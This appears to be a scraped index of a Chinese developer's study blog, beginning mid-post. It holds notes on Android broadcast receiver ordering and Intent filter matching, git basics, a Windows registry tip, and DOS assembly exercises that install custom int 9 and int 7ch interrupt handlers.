AndroidManifest.xml 中注册是无效的！ 因为这种特殊的广播如果在清单文件中注册，会浪费内存资源。你可以想象下，如果有100个应用在清单文件中注册了手机电量变化广播接收者，那当手机电量发生变化时，这100个应用的广播接收者就有可能都运行…那会造成什么结果…。所以：只能动态注册（在代码中注册） 有序广播 当广播为有序广播时 优先级高的先接收 同优先级的广播接收器，动态优先于静态 同优先级的同类广播接收器: 静态：先扫描（安装）的优先于后扫描的 动态：先注册的优先于后注册的 无序广播 如果广播是无序的，那么所有的registeredReceivers都会一次性被处理，因为所有的动态注册^动态注册流程 的广播，他们的进程都是活着的，直接让他们去处理就好了。但是这一条对于静态注册的广播不适用。这是因为静态注册^静态注册流程 的广播，我们无法知道他到底进程是否存活，而如果都不是活着的，需要先把进程拉起来，一次性拉起很多进程，这是性能上无法忍受的。所以静态注册的广播，不能像动态注册的广播那样一次性执行。发送无须广播时候，静态注册的Recevier的执行是这样的，按照receivers队列，依次检查队列里面的Receiver是否存活，如果是活着的，则执行该Recevierd的OnReceiver回调，如果进程尚不存在，则首先创建进程，然后执行BroadcastReceiver的OnRecevier 回调，当一个BroadcastReceiver执行完，再去执行receivers队列里的下一个BroadcastReceiver。而receivers队列是按照优先级排列的。 那么对于无序广播来说，BroadcastReceiver的执行顺序就明确了： 优先级不同或广播类型不同时: 无视优先级，动态广播接收器优先于静态广播接收器,所有的动态注册的BroadcastRecevier，会被一起执行，他们执行的顺序是不固定的，由Android的进程调度决定。 当动态注册的BroadcastRecevier被执行完以后，会按照优先级，依次执行静态注册的BroadcastReceiver。 同优先级的同类广播接收器: 静态：先扫描（安装）的优先于后扫描的 动态：先注册的优先于后注册的。 静态receiver的注册是由PackageManagerService开机的时候负责初始化 （PackageManagerService之后简称为PMS） PMS在开机的时候会对系统一些目录逐个扫描，解析apk文件。静态广播接收器就是在PMS做这件事情的时候顺便处理的。 PMS会解析apk的manifest文件，查找这里注册的receiver，然后加载到内存中 下面看一下PMS是如何工作的: 参考链接 参考链接 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111private final int broadcastIntentLocked(ProcessRecord callerApp, String callerPackage, Intent intent, String resolvedType, IIntentReceiver resultTo, int resultCode, String resultData, Bundle map, String requiredPermission, boolean ordered, boolean sticky, int callingPid, int callingUid) &#123; ………… ………… // 静态广播接收器list List receivers = null; // 动态广播接收器List List&lt;BroadcastFilter&gt; registeredReceivers = null; // 获取静态广播接收器mReceivers try &#123; if (intent.getComponent() != null) &#123; // Broadcast is going to one specific receiver class... ActivityInfo ai = AppGlobals.getPackageManager(). getReceiverInfo(intent.getComponent(), STOCK_PM_FLAGS); if (ai != null) &#123; receivers = new ArrayList(); ResolveInfo ri = new ResolveInfo(); ri.activityInfo = ai; receivers.add(ri); &#125; &#125; else &#123; // Need to resolve the intent to interested receivers... if ((intent.getFlags()&amp;Intent.FLAG_RECEIVER_REGISTERED_ONLY) == 0) &#123; receivers = AppGlobals.getPackageManager().queryIntentReceivers( intent, resolvedType, STOCK_PM_FLAGS); &#125; // 获取动态广播接收器mReceiverResolver registeredReceivers = mReceiverResolver.queryIntent(intent, resolvedType, false); &#125; &#125; catch (RemoteException ex) &#123; // pm is in same process, this will never happen. &#125; final boolean replacePending = (intent.getFlags()&amp;Intent.FLAG_RECEIVER_REPLACE_PENDING) != 0; int NR = registeredReceivers != null ? registeredReceivers.size() : 0; …… // 如果接收到的广播 是普通广播。 if (!ordered &amp;&amp; NR &gt; 0) &#123; // If we are not serializing this broadcast, then send the // registered receivers separately so they don&#x27;t wait for the // components to be launched. BroadcastRecord r = new BroadcastRecord(intent, callerApp, callerPackage, callingPid, callingUid, requiredPermission, registeredReceivers, resultTo, resultCode, resultData, map, ordered, sticky, false); // 很明显接收到普通广播之后，在这只处理了动态广播 registeredReceivers，对于普通广播而言，动态广播接收器要优先于静态广播接收器 无关设置的优先级 boolean replaced = false; if (replacePending) &#123; for (int i=mParallelBroadcasts.size()-1; i&gt;=0; i--) &#123; if (intent.filterEquals(mParallelBroadcasts.get(i).intent)) &#123; if (DEBUG_BROADCAST) Slog.v(TAG, &quot;***** DROPPING PARALLEL: &quot; + intent); mParallelBroadcasts.set(i, r); replaced = true; break; &#125; &#125; &#125; if (!replaced) &#123; mParallelBroadcasts.add(r); scheduleBroadcastsLocked(); &#125; //将registeredReceivers置为null，后面只处理静态广播接收器，所以不会有冲突。 registeredReceivers = null; NR = 0; &#125; //如果是有序广播，将静态广播接收器和动态广播接收器组合成一个最终的顺序 int ir = 0; if (receivers != null) &#123; ... //合并的过程，注意顺序 int NT = receivers != null ? receivers.size() : 0; int it = 0; ResolveInfo curt = null; BroadcastFilter curr = null; while (it &lt; NT &amp;&amp; ir &lt; NR) &#123; if (curt == null) &#123; curt = (ResolveInfo)receivers.get(it); &#125; if (curr == null) &#123; curr = registeredReceivers.get(ir); &#125; //如果动态广播接收器优先级高于或者等于静态广播接收器，那么就插到前面 //很明显动态的要在静态的前面 if (curr.getPriority() &gt;= curt.priority) &#123; // Insert this broadcast record into the final list. receivers.add(it, curr); ir++; curr = null; it++; NT++; &#125; else &#123; // Skip to the next ResolveInfo in the final list. it++; curt = null; &#125; &#125; &#125;"},{"title":"8.0版本之后的广播","date":"2019-11-14","updated":"2024-03-19","path":"2019/11/14/8.0版本之后的广播/","text":"问题 今天做实验时写了两个类继承自广播类，注册静态广播，但是却怎么也收不到静态广播消息 解决 123Android 8.0 以前，对于静态注册的广播接收器，发送自定义广播时只需构造Intent并设置action，然后调用sendBroadcast（intent）即可发送；而在Android 8.0 之后，参照官方文档，对于静态注册的广播接收器的管理更为严格，以上代码已不再适用，还需添加如下代码才能实现。（Android 8.0官方文档在文末给出）intent.setComponent(new ComponentName(&quot;pkg&quot;,&quot;cls&quot;)); 其中pkg为项目包名，cls为静态注册的广播接收器的完整路径。例如： 1intent.setComponent(new ComponentName(&quot;com.example.broadcasttest&quot;,&quot;com.example.broadcasttest.MyBroadcastReceiver&quot;)); 1也就是说Android 8.0 之后发送自定义广播更加“精确”，需要精确指定接收器的路径才能发送成功。 总结 在Android 8.0 之后想要令多个静态注册的接收器接收这一自定义广播很难办到，因为pkg和cls都已经给定了，除非再构造一个Intent出来，然后重复上述过程，发送两个广播。那么若有一需求要求向很多程序发送该广播，那么该方法就很不实际了。"},{"title":"Android intent","date":"2019-11-14","updated":"2024-03-19","path":"2019/11/14/intent/","text":"Intent解析的匹配规则 动作Action检测 一个Intent Filter元素至少应该包含一个Action，否则任何一个Intent请求都不能与之匹配成功； 如果一个Intent Filter包含多个Action，只要其中一个Action匹配Intent请求中的Action成功，则该Intent Filter匹配成功； 例如： 1234567891011&lt;intent-filter&gt; &lt;action android:name=&quot;com.example.project.SHOW_CURRENT&quot; /&gt; &lt;action android:name=&quot;com.example.project.SHOW_RECENT&quot; /&gt; &lt;action android:name=&quot;com.example.project.SHOW_PENDING&quot; /&gt; . . .&lt;/intent-filter&gt; 只要Intent请求中有上述三条中的一条即算Action匹配成功。 如果Intent请求中没有Action项，则对于任何Intent Filter，只要其中含有Action项，都能匹配成功。 种类Category检测 对Action的附加描述—必须在设置Action的情况下才能使用; 只有当Intent请求中的所有Category属性在一个Intent Filter中都能找到相应的Category匹配项时，才算匹配成功， Intent Filter 中多余的Category并不会导致匹配失败； 一个不包含Category项的IntentFilter只会匹配同样不包含Category的Intent请求； 原则上如果一个Intent请求中没有Category项，应该总是通过种类检测（即匹配成功），而不管Intent Filter中有什么Category； 但是，有个例外，Android对待所有传递给Context.startActivity()的隐式intent，它们内部至少包含“android.intent.category.DEFAULT” 。因此，**Activity想要接收隐式intent必须要在intent过滤器的种类部分中包含android.intent.category.DEFAULT 数据Data检测–1 每个元素指定一个URI和数据类型（MIME类型）。它有四个属性scheme、host、port、path对应于URI的每个部分： scheme://host:port/path 例如：content://com.example.project:200/folder/subfolder/etc scheme是content，host是&quot;com.example.project&quot;，port是200，path是“/folder/subfolder/etc&quot;。 host和port一起构成URI的凭据（authority），如果host没有指定，port也被忽略。 这四个属性都是可选的，但它们之间并不都是完全独立的。要让authority有意义，scheme必须也要指定。要让path有意义，scheme和authority也都必须要指定(匹配时在Intent filter中如果前面的属性不指定,则不检测后面的属性值总是通过检测)。 数据Data检测—2 MIME类型就是设定某种扩展名的文件用一种应用程序来打开的方式类型**，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。 服务器会将它们发送的多媒体数据的类型告诉浏览器，而通知手段就是说明该多媒体数据的MIME类型，从而让浏览器知道接收到的信息哪些是MP3文件，哪些是BMP文件等等。服务器将MIME标志符放入传送的数据中来告诉浏览器使用哪种插件读取相关文件。 MIME类型其实就是一个字符串，中间用一个 “/” 来隔开，“/”前面的部分是系统识别的部分，就相当于我们定义一个变量时的变量数据类型，据此系统能够知道我们所要表示的是个什么东西。至于 “/” 后面的部分就是我们自已来随便定义的“变量名”（类型名称）了。 元素的type属性指定数据的MIME类型，Intent请求和Intent Filter都可以用“*”通配符匹配子类型字段 ​ 例如“text/”，“audio/*”表示任何子类型。 数据Data检测—3 数据检测既要检测URI，也要检测数据类型**。规则如下(**一一对应匹配)： 一个Intent请求既不包含URI，也不包含数据类型(只有Action的情况) ：仅当Intent Filter也不指定任何URIs和数据类型时，才能通过检测，其余情况均不通过。 一个Intent请求包含URI，但不包含数据类型：仅当Intent Filter也不指定数据类型，同时它们的URI匹配，才能匹配成功。 一个Intent请求包含数据类型，但不包含URI：仅当Intent Filter也只包含数据类型且与Intent请求相同，才匹配成功。 一个Intent请求既包含URI，也包含数据类型，只有二者与Intent Filter全部匹配才算通过； 数据Data检测—4 Intent filter示例（Data部分检测）： ，这个组件能够从内容提供者获取image数据并显示它。 因为大部分可用数据由内容提供者（content provider）分发，过滤器指定一个数据类型但没有指定URI或许更通用。 ，这个组件能够从网络获取视频数据并显示它。 当用户点击一个web页面上的link，浏览器应用程序首先会试图去显示数据，如果它不能显示数据，它将把一个隐式Intent加上scheme和数据类型，去启动一个能够做此工作的Activity。"},{"title":"git学习","date":"2019-11-13","updated":"2024-03-19","path":"2019/11/13/git/","text":"所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。 不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。 因为文本是有编码的，比如中文有常用的GBK编码，日文有Shift_JIS编码，如果没有历史遗留问题，强烈建议使用标准的UTF-8编码，所有语言使用同一种编码，既没有冲突，又被所有平台所支持。 使用Windows的童鞋要特别注意： 千万不要使用Windows自带的记事本编辑任何文本文件。原因是Microsoft开发记事本的团队使用了一个非常弱智的行为来保存UTF-8编码的文件，他们自作聪明地在每个文件开头添加了0xefbbbf（十六进制）的字符，你会遇到很多不可思议的问题，比如，网页第一行可能会显示一个“?”，明明正确的程序一编译就报语法错误，等等，都是由记事本的弱智行为带来的。 创建版本库 什么是版本库呢？版本库又名仓库，英文名repository，你可以简单理解成一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的修改、删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。 第一步，创建一个版本库，首先，选择一个合适的地方，创建一个空目录： 1234$ mkdir learngit$ cd learngit$ pwd/Users/michael/learngit 第二步，通过git init命令把这个目录变成Git可以管理的仓库： 12$ git initInitialized empty Git repository in /Users/michael/learngit/.git/ 瞬间Git就把仓库建好了，而且告诉你是一个空的仓库（empty Git repository），细心的读者可以发现当前目录下多了一个.git的目录，这个目录是Git来跟踪管理版本库的，没事千万不要手动修改这个目录里面的文件，不然改乱了，就把Git仓库给破坏了。 把文件添加到版本库 现在我们编写一个readme.txt文件，内容如下： 12Git is a version control system.Git is free software. 一定要放到learngit目录下（子目录也行），因为这是一个Git仓库，放到其他地方Git再厉害也找不到这个文件。 和把大象放到冰箱需要3步相比，把一个文件放到Git仓库只需要两步。 第一步，用命令git add告诉Git，把文件添加到仓库： 1$ git add readme.txt 执行上面的命令，没有任何显示，这就对了，Unix的哲学是“没有消息就是好消息”，说明添加成功。 第二步，用命令git commit告诉Git，把文件提交到仓库： 1234$ git commit -m &quot;wrote a readme file&quot;[master (root-commit) eaadf4e] wrote a readme file 1 file changed, 2 insertions(+) create mode 100644 readme.txt 简单解释一下git commit命令，-m后面输入的是本次提交的说明，可以输入任意内容，当然最好是有意义的，这样你就能从历史记录里方便地找到改动记录。 为什么Git添加文件需要 add，commit一共两步呢？ 因为commit可以一次提交很多文件，所以你可以多次add不同的文件，比如： 123$ git add file1.txt$ git add file2.txt file3.txt$ git commit -m &quot;add 3 files.&quot; 如果git status告诉你有文件被修改过，用git diff可以查看修改内容。 在实际工作中，我们脑子里怎么可能记得一个几千行的文件每次都改了什么内容，不然要版本控制系统干什么。版本控制系统肯定有某个命令可以告诉我们历史记录，在Git中，我们用git log命令查看： 回退版本 Git的版本回退速度非常快，因为Git在内部有个指向当前版本的HEAD指针，当你回退版本的时候，Git仅仅是把HEAD从指向append GPL： 123456789┌────┐│HEAD│└────┘ │ └──&gt; ○ append GPL │ ○ add distributed │ ○ wrote a readme file 改为指向add distributed： 123456789┌────┐│HEAD│└────┘ │ │ ○ append GPL │ │ └──&gt; ○ add distributed │ ○ wrote a readme file 然后顺便把工作区的文件更新了。所以你让HEAD指向哪个版本号，你就把当前版本定位在哪。 工作区和暂存区 Git和其他版本控制系统如SVN的一个不同之处就是有暂存区的概念。 工作区（Working Directory） 就是你在电脑里能看到的目录，比如我的note文件夹就是一个工作区： 版本库（Repository） 工作区有一个隐藏目录.git，这个不算工作区，而是Git的版本库。 Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支master，以及指向master的一个指针叫HEAD。 前面讲了我们把文件往Git版本库里添加的时候，是分两步执行的： 第一步是用git add把文件添加进去，实际上就是把文件修改添加到暂存区； 第二步是用git commit提交更改，实际上就是把暂存区的所有内容提交到当前分支。 因为我们创建Git版本库时，Git自动为我们创建了唯一一个master分支，所以，现在，git commit就是往master分支上提交更改。 你可以简单理解为，需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。 一旦提交后，如果你又没有对工作区做任何修改，那么工作区就是“干净”的： 123$ git statusOn branch masternothing to commit, working tree clean 撤销修改 git checkout -- file可以丢弃工作区的修改： 1$ git checkout -- readme.txt 命令git checkout -- readme.txt意思就是，把readme.txt文件在工作区的修改全部撤销，这里有两种情况： 一种是readme.txt自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态； 一种是readme.txt已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。 总之，就是让这个文件回到最近一次git commit或git add时的状态。 git checkout -- file命令中的--很重要，没有--，就变成了“切换到另一个分支”的命令，我们在后面的分支管理中会再次遇到git checkout命令。 现在假定是凌晨3点，你不但写了一些胡话，还git add到暂存区了： 12345678$ cat readme.txtGit is a distributed version control system.Git is free software distributed under the GPL.Git has a mutable index called stage.Git tracks changes of files.My stupid boss still prefers SVN.$ git add readme.txt 庆幸的是，在commit之前，你发现了这个问题。用git status查看一下，修改只是添加到了暂存区，还没有提交： 123456$ git statusOn branch masterChanges to be committed: (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage) modified: readme.txt Git同样告诉我们，用命令git reset HEAD 可以把暂存区的修改撤销掉（unstage），重新放回工作区： 123$ git reset HEAD readme.txtUnstaged changes after reset:M readme.txt git reset命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用HEAD时，表示最新的版本。 再用git status查看一下，现在暂存区是干净的，工作区有修改： 1234567$ git statusOn branch masterChanges not staged for commit: (use &quot;git add &lt;file&gt;...&quot; to update what will be committed) (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory) modified: readme.txt 还记得如何丢弃工作区的修改吗？ 12345$ git checkout -- readme.txt$ git statusOn branch masternothing to commit, working tree clean 整个世界终于清静了！ 删除文件 在Git中，删除也是一个修改操作，我们实战一下，先添加一个新文件test.txt到Git并且提交： 123456$ git add test.txt$ git commit -m &quot;add test.txt&quot;[master b84166e] add test.txt 1 file changed, 1 insertion(+) create mode 100644 test.txt 一般情况下，你通常直接在文件管理器中把没用的文件删了，或者用rm命令删了： 1$ rm test.txt 这个时候，Git知道你删除了文件，因此，工作区和版本库就不一致了，git status命令会立刻告诉你哪些文件被删除了： 123456789$ git statusOn branch masterChanges not staged for commit: (use &quot;git add/rm &lt;file&gt;...&quot; to update what will be committed) (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory) deleted: test.txtno changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;) 现在你有两个选择，一是确实要从版本库中删除该文件，那就用命令git rm删掉，并且git commit： 1234567$ git rm test.txtrm &#x27;test.txt&#x27;$ git commit -m &quot;remove test.txt&quot;[master d46f35e] remove test.txt 1 file changed, 1 deletion(-) delete mode 100644 test.txt 现在，文件就从版本库中被删除了。 另一种情况是删错了，因为版本库里还有呢，所以可以很轻松地把误删的文件恢复到最新版本： 1$ git checkout -- test.txt git checkout其实是用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以“一键还原”。 推送到远程仓库github 目前，在GitHub上的这个learngit仓库还是空的，GitHub告诉我们，可以从这个仓库克隆出新的仓库，也可以把一个已有的本地仓库与之关联，然后，把本地仓库的内容推送到GitHub仓库。 现在，我们根据GitHub的提示，在本地的learngit仓库下运行命令： 1$ git remote add origin git@github.com:michaelliao/learngit.git 请千万注意，把上面的michaelliao替换成你自己的GitHub账户名，否则，你在本地关联的就是我的远程库，关联没有问题，但是你以后推送是推不上去的，因为你的SSH Key公钥不在我的账户列表中。 添加后，远程库的名字就是origin，这是Git默认的叫法，也可以改成别的，但是origin这个名字一看就知道是远程库。 下一步，就可以把本地库的所有内容推送到远程库上： 12345678910$ git push -u origin masterCounting objects: 20, done.Delta compression using up to 4 threads.Compressing objects: 100% (15/15), done.Writing objects: 100% (20/20), 1.64 KiB | 560.00 KiB/s, done.Total 20 (delta 5), reused 0 (delta 0)remote: Resolving deltas: 100% (5/5), done.To github.com:michaelliao/learngit.git * [new branch] master -&gt; masterBranch &#x27;master&#x27; set up to track remote branch &#x27;master&#x27; from &#x27;origin&#x27;. 把本地库的内容推送到远程，用git push命令，实际上是把当前分支master推送到远程。 由于远程库是空的，我们第一次推送master分支时，加上了-u参数，Git不但会把本地的master分支内容推送的远程新的master分支，还会把本地的master分支和远程的master分支关联起来，在以后的推送或者拉取时就可以简化命令。 从现在起，只要本地作了提交，就可以通过命令： 1$ git push origin master 把本地master分支的最新修改推送至GitHub，现在，你就拥有了真正的分布式版本库！ 要关联一个远程库，使用命令 1$ git remote add origin git@server-name:path/repo-name.git 关联后，使用命令git push -u origin master第一次推送master分支的所有内容； 此后，每次本地提交后，只要有必要，就可以使用命令git push origin master推送最新修改； 分布式版本系统的最大好处之一是在本地工作完全不需要考虑远程库的存在，也就是有没有联网都可以正常工作，而SVN在没有联网的时候是拒绝干活的！当有网络的时候，再把本地提交推送一下就完成了同步，真是太方便了！ 分支管理 参考链接"},{"title":"git使用","date":"2019-11-13","updated":"2024-03-19","path":"2019/11/13/git使用/","text":"推送本地代码到远程仓库 推送分为 3 步： 添加要推送的文件 (git add test.md) 提交到本地仓库（git commit -m “我自己的提交”） 推送到远程仓库（git push -u origin master）这里是说推送主分支库 克隆远程代码到本地 首先删除当前目录下同名的文件夹 git clone (git ssh地址) git log命令查看： 在实际工作中，我们脑子里怎么可能记得一个几千行的文件每次都改了什么内容，不然要版本控制系统干什么。版本控制系统肯定有某个命令可以告诉我们历史记录，在Git中，我们用git log命令查看 git log命令显示从最近到最远的提交日志 如果嫌输出信息太多，看得眼花缭乱的，可以试试加上--pretty=oneline参数： 1234$ git log --pretty=oneline1094adb7b9b3807259d8cb349e7df1d4d6477073 (HEAD -&gt; master) append GPLe475afc93c209a690c39c13a46716e8fa000c366 add distributedeaadf4e385e865d25c48e7ca9c8395c3f7dfaef0 wrote a readme file 需要友情提示的是，你看到的一大串类似1094adb...的是commit id（版本号），和SVN不一样，Git的commit id不是1，2，3……递增的数字，而是一个SHA1计算出来的一个非常大的数字，用十六进制表示，而且你看到的commit id和我的肯定不一样，以你自己的为准。为什么commit id需要用这么一大串数字表示呢？因为Git是分布式的版本控制系统，后面我们还要研究多人在同一个版本库里工作，如果大家都用1，2，3……作为版本号，那肯定就冲突了。 每提交一个新版本，实际上Git就会把它们自动串成一条时间线。如果使用可视化工具查看Git历史，就可以更清楚地看到提交历史的时间线： 1$ git log --graph 查看分支情况 回退版本 首先，Git必须知道当前版本是哪个版本，在Git中，用HEAD表示当前版本，也就是最新的提交1094adb...（注意我的提交ID和你的肯定不一样），上一个版本就是HEAD^，上上一个版本就是HEAD^^，当然往上100个版本写100个^比较容易数不过来，所以写成HEAD~100。 现在，我们要把当前版本append GPL回退到上一个版本add distributed，就可以使用git reset命令： 12$ git reset --hard HEAD^HEAD is now at e475afc add distributed 还原到回退版本的之前版本 最新的那个版本append GPL已经看不到了！好比你从21世纪坐时光穿梭机来到了19世纪，想再回去已经回不去了，肿么办？ 办法其实还是有的，只要上面的命令行窗口还没有被关掉，你就可以顺着往上找啊找啊，找到那个append GPL的commit id是1094adb...，于是就可以指定回到未来的某个版本： 12$ git reset --hard 1094aHEAD is now at 83b0afe append GPL 版本号没必要写全，前几位就可以了，Git会自动去找。当然也不能只写前一两位，因为Git可能会找到多个版本号，就无法确定是哪一个了。 再小心翼翼地看看readme.txt的内容： 123$ cat readme.txtGit is a distributed version control system.Git is free software distributed under the GPL. 果然，我胡汉三又回来了。 现在，你回退到了某个版本，关掉了电脑，第二天早上就后悔了，想恢复到新版本怎么办？找不到新版本的commit id怎么办？ 在Git中，总是有后悔药可以吃的。当你用$ git reset --hard HEAD^回退到add distributed版本时，再想恢复到append GPL，就必须找到append GPL的commit id。Git提供了一个命令git reflog用来记录你的每一次命令： 12345$ git refloge475afc HEAD@&#123;1&#125;: reset: moving to HEAD^1094adb (HEAD -&gt; master) HEAD@&#123;2&#125;: commit: append GPLe475afc HEAD@&#123;3&#125;: commit: add distributedeaadf4e HEAD@&#123;4&#125;: commit (initial): wrote a readme file 终于舒了口气，从输出可知，append GPL的commit id是1094adb，现在，你又可以乘坐时光机回到未来了 撤销修改 丢弃工作区修改 1$ git checkout -- file.txt 命令git checkout -- readme.txt意思就是，把readme.txt文件在工作区的修改全部撤销，这里有两种情况： 一种是readme.txt自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态； 一种是readme.txt已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。 总之，就是让这个文件回到最近一次git commit或git add时的状态。 丢弃暂存区修改 git reset HEAD 可以把暂存区的修改撤销掉（unstage），重新放回工作区： git reset命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用HEAD时，表示最新的版本。 再用git status查看一下，现在暂存区是干净的，工作区有修改： 删除文件 命令git rm用于删除一个文件。如果一个文件已经被提交到版本库，那么你永远不用担心误删，但是要小心，你只能恢复文件到最新版本，你会丢失最近一次提交后你修改的内容。 添加上传远程仓库 github 要关联一个远程库，使用命令git remote add origin git@server-name:path/repo-name.git； 关联后，使用命令git push -u origin master第一次推送master分支的所有内容； 此后，每次本地提交后，只要有必要，就可以使用命令git push origin master推送最新修改； 分布式版本系统的最大好处之一是在本地工作完全不需要考虑远程库的存在，也就是有没有联网都可以正常工作，而SVN在没有联网的时候是拒绝干活的！当有网络的时候，再把本地提交推送一下就完成了同步，真是太方便了！ 总结 添加要推送的文件 (git add test.md) 提交到本地仓库（git commit -m “我自己的提交”） 推送到远程仓库（git push -u origin master）这里是说推送主分支库 HEAD指向的版本就是当前版本，因此，Git允许我们在版本的历史之间穿梭，使用命令git reset --hard commit_id。 穿梭前，用git log可以查看提交历史，以便确定要回退到哪个版本。 要重返未来，用git reflog查看命令历史，以便确定要回到未来的哪个版本。 场景1：当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令git checkout -- file。 场景2：当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令git reset HEAD ，就回到了场景1，第二步按场景1操作。 场景3：已经提交了不合适的修改到版本库时，想要撤销本次提交，参考版本回退一节，不过前提是没有推送到远程库。 git相关知识 所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。 不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。 因为文本是有编码的，比如中文有常用的GBK编码，日文有Shift_JIS编码，如果没有历史遗留问题，强烈建议使用标准的UTF-8编码，所有语言使用同一种编码，既没有冲突，又被所有平台所支持。 使用Windows的童鞋要特别注意： 千万不要使用Windows自带的记事本编辑任何文本文件。原因是Microsoft开发记事本的团队使用了一个非常弱智的行为来保存UTF-8编码的文件，他们自作聪明地在每个文件开头添加了0xefbbbf（十六进制）的字符，你会遇到很多不可思议的问题，比如，网页第一行可能会显示一个“?”，明明正确的程序一编译就报语法错误，等等，都是由记事本的弱智行为带来的。"},{"title":"win10右键新建文件添加自定义文件","date":"2019-11-13","updated":"2024-03-19","path":"2019/11/13/windows右键新建文件/","text":"win10 右键新建文件添加自定义文件 参考链接 win+r 打开regedit 进入HKEY_CLASSES_ROOT 中的 .md (MarkDown文件实例，添加其他格式的文件就找其他文件的后缀) 右击.md 新建项 ShellNew 点击ShellNew，右边空白处新建字符串值，名为NullFile"},{"title":"汇编学习第十五章","date":"2019-10-25","updated":"2024-03-19","path":"2019/10/25/汇编学习第十五章/","text":"实验 安装新的int 9 中断例程 安装一个新的int 9中断例程，功能：在DOS下，按下“A”键后，除非不松开，如果松开，就显示满屏幕的“A”，其他的键照常处理。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566assume cs:codecode segment start: sli ;防止在设置中断向量表之前出现有键盘输入导致错误 mov ax, cs mov ds, ax mov si, offset int9 mov ax, 0 mov es, ax mov di, 204h ;[200]与[202]要存放原int 9的IP和CS mov cx, offset int9_end - offset int9 cld ;正向复制 rep movsb mov ax, es:[9*4] mov es:[200h], ax mov ax, es:[9*4+2] mov es:[202h], ax ;保存原int 9中断例程入口地址 mov word ptr es:[9*4], 204h mov word ptr es:[9*4+2], 0 ;设置中断向量表 sti ;IF设置1 mov ax, 4c00h int 21h----------------------int9------------------------- int9: push ds push ax push cx push si in al, 60h ;接受60h来的扫描码 pushf call dword ptr cs:[200h] cmp al, 1eh+80h ;A是否被松开 jne int9_ok ;不是松开正常处理 mov ax, 0b800h mov ds, ax mov si, 0 mov cx, 2000 ;打满一屏是2000个字符 print_char: mov byte ptr [si], &#x27;A&#x27; add si, 2 loop print_char int9_ok: pop si pop cx pop ax pop ds iret int9_end: nopcode endsend start"},{"title":"汇编学习第十三章","date":"2019-10-24","updated":"2024-03-19","path":"2019/10/24/汇编学习第十三章/","text":"实验13(1) （1）编写并安装int 7ch中断例程，功能为显示一个用0结尾的字符串，中断例程安装在0：200处。 参数： (dh)=行号， (dl)=列号, (cl)=颜色 ds:si指向字符串首地址 以上中断例程安装好后，对下面的程序进行单步跟踪，尤其注意int，iret指令执行前后cs，ip的和栈中的状态。 123456789101112131415161718192021222324252627282930313233assume cs:codedata segment db &#x27;Welcome to masm!&#x27;, 0data endscode segmentstart: mov dh, 10 ;所在行数：11行 mov dl, 10 ;所在列数：11列 mov cl, 2 ;字符属性 mov ax, data mov ds, ax mov si, 0 ;入口参数ds：si指向字符串data int 7ch ;调用9号子程序，显示字符串 mov ax, 4c00H int 21Hcode endsend start 程序分析： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119assume cs:codecode segmentstart: ;7cH中断例程的安装程序 mov ax, cs mov ds, ax mov si, offset show_str ;将ds:si指向源地址（show_str的机器码） mov ax, 0000H mov es, ax mov di, 200H ;将es:di指向目的地址（0:200H向量表中） mov cx, offset show_strend - offset show_str ;设置传输长度 cld ;传输方向为正 rep movsb ;字节传输 ;设置中断向量表，使7cH条目中断向量指向0000:200H mov ax, 0000H mov es, ax mov word ptr es:[7cH*4], 200H mov word ptr es:[7cH*4+2], 0000H mov ax, 4c00H int 21H;-------;装载的例程：7cH;功能：int 7cH实现按行和列及字符属性显示字符串功能;入口参数：入口参数：dh-行数、dl-列数、cl-字符属性,ds:si指向data字符串;返回值：无;------- show_str: push dx push cx push si ;将子程序用到的寄存器入栈 mov ax, 0b800H mov es, ax ;设置显示缓冲区内存段 mov ax, 0 ;（ax）= 0，防止高位不为零 mov al, 160 ;0a0H- 160字节/行 mul dh ;相对于0b800:0000第dh行偏移量 mov bx, ax ;将第（dh）行的偏移地址送入bx，bx代表行偏移 mov ax, 0 mov al, 2 